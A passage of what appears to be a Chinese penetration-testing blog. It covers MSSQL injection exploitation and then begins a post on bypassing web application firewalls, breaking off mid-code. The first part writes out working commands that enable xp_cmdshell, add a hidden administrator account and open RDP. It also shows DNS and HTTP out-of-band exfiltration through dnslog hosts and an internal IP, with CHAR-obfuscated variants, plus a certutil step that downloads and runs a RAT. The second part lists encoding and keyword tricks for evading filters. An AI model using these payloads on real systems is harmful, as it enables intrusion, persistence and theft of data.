class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span></span><br><span class="line">;RECONFIGURE <span class="keyword">WITH</span> OVERRIDE</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>spoacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合spoamethod 来写文件执行cmd</p><p>在以前的系统有这几种用法,调用cmd 来执行命令,写入启动项,粘贴键替换</p><ul><li><strong>xp_cmdshell 外带判断执行</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&#x27;http://172.16.12.*:9000&#x27;)&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;net user zs p@ssw0rd /add&quot;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;net localgroup administrators zs /add&quot;</span><br></pre></td></tr></table></figure><ul><li><strong>开启3389</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;&quot; &quot;&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;hello word &quot;&quot;!&quot;   <span class="operator">/</span><span class="operator">/</span>mssql特性:两个双引号为 <span class="operator">/</span>转义符号</span><br></pre></td></tr></table></figure><ul><li><strong>判断xp_cmdshell 是否成功</strong></li></ul><p>新建一个库,把查询结果写到表里,然后在查询出来,进行判断是否开启成功,和查询执行回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; create table sqldata(result VARCHAR(8000)); --   #新建一个表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> sqldata (<span class="keyword">result</span>) <span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;echo xxx&#x27;</span><span class="comment">--#写表内容</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1&lt;char(126)%2b(select top 1 cast(result as varchar(8000)) from sqldata where result not in (select top 0 isnull(result,&#x27;&#x27;) from sqldata )) -- </span></span><br><span class="line"><span class="string">#查询内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>; <span class="keyword">delete</span> <span class="keyword">from</span> sqldata; <span class="comment">--  #清空上一条查询内容.</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#x27;</span>net <span class="keyword">user</span><span class="string">&#x27;--  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">&lt;</span><span class="type">char</span>(<span class="number">126</span>)<span class="operator">%</span><span class="number">2</span>b(<span class="keyword">select</span> top <span class="number">1</span> <span class="built_in">cast</span>(<span class="keyword">result</span> <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">8000</span>)) <span class="keyword">from</span> sqldata <span class="keyword">where</span> <span class="keyword">result</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">0</span> isnull(<span class="keyword">result</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> sqldata )) <span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="外带查询"><a href="#外带查询" class="headerlink" title="外带查询"></a>外带查询</h2><p><strong>xp_dirtree</strong> </p><p>是一个列目录的mssql函数, 结合 \\ Smb(文件共享)资源匹配符来访问 dns解析域名.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);    <span class="comment">--定义一个变量</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="string">&#x27;.j2bg99.dnslog.cn&#x27;</span>;    <span class="operator">/</span><span class="operator">/</span>变量赋值</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;         <span class="operator">/</span><span class="operator">/</span>执行变量</span><br><span class="line"></span><br><span class="line">#把单引号转成<span class="type">char</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="type">CHAR</span>(<span class="number">92</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">92</span>)<span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">46</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">55</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">99</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">118</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">46</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">100</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">110</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">108</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">103</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">46</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">99</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span> master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">0</span> name <span class="keyword">from</span> master.dbo.sysdatabases))))<span class="operator">+</span><span class="string">&#x27;.j2bg99.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p><strong>certutil.exe</strong> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;certutil.exe -urlcache -split -f http://192.168.21.66:9000/?data=&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), @<span class="variable">@version</span>))<span class="operator">+</span><span class="string">&#x27; c:\windows\temp\temp.db&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p><strong>ping</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;ping -n 2 &#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="string">&#x27;.os7tcv.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br><span class="line"></span><br><span class="line">#把单引号转成<span class="type">char</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">112</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">103</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">45</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>)<span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">55</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">118</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">103</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p><strong>powershell</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;powershell IEX (new-object net.webclient).downloadstring(&#x27;&#x27;http://192.168.21.66:9000/?data=&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), @<span class="variable">@version</span>))<span class="operator">+</span><span class="string">&#x27;&#x27;&#x27;)&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br><span class="line"></span><br><span class="line">#把单引号转成<span class="type">char</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="type">CHAR</span>(<span class="number">112</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">114</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">104</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">73</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">69</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">88</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">40</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">45</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">98</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">106</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">98</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">41</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">97</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">114</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">103</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">40</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">39</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">104</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">112</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">58</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">47</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">47</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">49</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">57</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">49</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">54</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">56</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">49</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">54</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">54</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">58</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">57</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">48</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">48</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">48</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">47</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">63</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">97</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">97</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">61</span>)<span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), @<span class="variable">@version</span>))<span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">39</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">41</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><h2 id="站库分离提权"><a href="#站库分离提权" class="headerlink" title="站库分离提权"></a>站库分离提权</h2><p>在我们遇到站库分离的时候，没办法写webshell，后台也没办法拿下shell的情况下不妨试试用xp_cmdshell下载我们的RAT直接拿下数据库.通过下载木马执行来上线提权.</p><p>1.certutil</p><p>2.vbs</p><p>3.bitsadmin</p><p>4.powershell</p><p>5.ftp</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master.dbo.xp_cmdshell <span class="string">&#x27;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> master.dbo.xp_cmdshell <span class="string">&#x27;cd c:\www &amp; file.exe&#x27;</span>;</span><br></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/FWsU6nFlX7j7jZxDi7xglA">https://mp.weixin.qq.com/s/FWsU6nFlX7j7jZxDi7xglA</a></p><p> union select name from test.dbo.columns where id=(select id from test.dbo.sysobjects  where name =’users’)–</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入常见字符WAF绕过</title>
      <link href="/posts/24561/"/>
      <url>/posts/24561/</url>
      
        <content type="html"><![CDATA[<p>大小写混合<br>替换关键字<br>使用编码<br>使用注释<br>参数污染<br>缓冲区溢出<br>性能因素<br>整合绕过…….</p><h3 id="1-大小写绕过："><a href="#1-大小写绕过：" class="headerlink" title="1.大小写绕过："></a>1.大小写绕过：</h3><ul><li>大小写绕过用于只针对小写或大写的关键字匹配技术</li><li>出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数</li><li>用法：比如，拦截了union，那就使用uNIoN</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">-3</span>uNIoNsELect1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-替换关键字"><a href="#2-替换关键字" class="headerlink" title="2.替换关键字"></a>2.替换关键字</h3><h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><ul><li>出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。</li><li>用法：xxx.com/index.php?id=-3UNIunionONSELselectECT1,2,3</li></ul><h4 id="同价词替换"><a href="#同价词替换" class="headerlink" title="同价词替换"></a>同价词替换</h4><ul><li><p>出现原因：WAF主要是针对一些特殊的关键词进行检测</p></li><li><p>and和or不能使用：&amp;&amp;和|| and和or xro ! not</p></li><li><p>=不能使用的情况：可以尝试&lt;、&gt;=</p></li><li><p>空格不能使用（常见）：%20%09%0a%0b%0c%0d%a0/**/空格</p></li><li><p>注意：在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗</p></li></ul><h4 id="特殊字符拼接"><a href="#特殊字符拼接" class="headerlink" title="特殊字符拼接"></a>特殊字符拼接</h4><ul><li>出现原因：把特殊字符拼接起来绕过WAF的检测</li><li>用法：如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span>(master..xp_cmdshell<span class="string">&#x27;netuser’)</span></span><br><span class="line"><span class="string">xxx.com/index.php?id=1;exec(&#x27;</span>maste<span class="string">&#x27;+&#x27;</span>r..xp<span class="string">&#x27;+&#x27;</span>_cmdshell<span class="string">&#x27;+&#x27;</span>&quot;netuser&quot;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><ul><li><p>对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等URL编码</p></li><li><p>出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf</p></li></ul><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><ul><li>输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等</li><li>注意：如果URL编码只进行了一次过滤，可以用两次编码绕过</li><li>用法：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">75</span><span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">69</span><span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">73</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">6</span>c<span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">74</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">0</span>a</span><br></pre></td></tr></table></figure><ul><li><strong>常用url编码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">空格绕过:</span><br><span class="line">/*%0A*/    //#强制空格</span><br><span class="line">%0A%0D     //使用换行符代替空格。注意服务器若为Windows则换行符为%0A%0D，Linux则为%0A</span><br><span class="line">%09TAB 键(水平)</span><br><span class="line">%0a新建一行</span><br><span class="line">%0c新的一页</span><br><span class="line">%0dreturn 功能</span><br><span class="line">%0bTAB 键(垂直)</span><br><span class="line">%a0空格</span><br><span class="line"></span><br><span class="line">绕过 </span><br><span class="line">/*%0A*/union/*%0A*/</span><br><span class="line">/*%0A*/and/*%0A*/</span><br></pre></td></tr></table></figure><h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><ul><li><p>常用符号的Unicode编码：单引号:%u0027空格：%u0020左括号：%u0028右括号：%u0029</p></li><li><p>用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>un<span class="operator">%</span>u0069onsel<span class="operator">%</span>u0065ct1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="4-注释绕过："><a href="#4-注释绕过：" class="headerlink" title="4.注释绕过："></a>4.注释绕过：</h3></li><li><p>常见的用于注释的符号：//、–、/**/、#、–+、—、;、–a</p></li><li><p>出现原因：利用语言函数特性来绕过waf的规则</p></li></ul><h4 id="普通注释"><a href="#普通注释" class="headerlink" title="普通注释"></a>普通注释</h4><ul><li>/**/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。* </li><li>用法：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 